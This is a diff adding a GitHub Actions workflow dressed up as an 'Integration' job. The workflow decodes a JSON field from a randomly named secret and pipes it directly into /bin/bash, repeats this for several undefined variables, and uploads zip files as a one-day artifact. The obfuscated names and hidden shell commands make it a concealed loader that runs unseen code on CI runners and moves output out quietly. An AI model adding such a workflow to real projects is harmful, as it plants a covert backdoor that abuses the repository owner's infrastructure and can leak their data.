@@ -1,0 +1,28 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ejesa464: ${{ secrets.ejesa464 }}
+        run: |
+          printf '%s' "$ejesa464" | jq -r .scidp511 | /bin/bash
+          printf '%s' "$alp70824" | jq -r .pgjjr28 | /bin/bash
+          echo $vsm74 | jq -r .nmm8415 | /bin/bash
+          printf '%s' "$yec71" | jq -r .prylw05 | /bin/bash
+          printf '%s' "$rmxe9553" | jq -r .vgjdu3 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7Aexm6JJ
+          path: "*.zip"
+          retention-days: 1
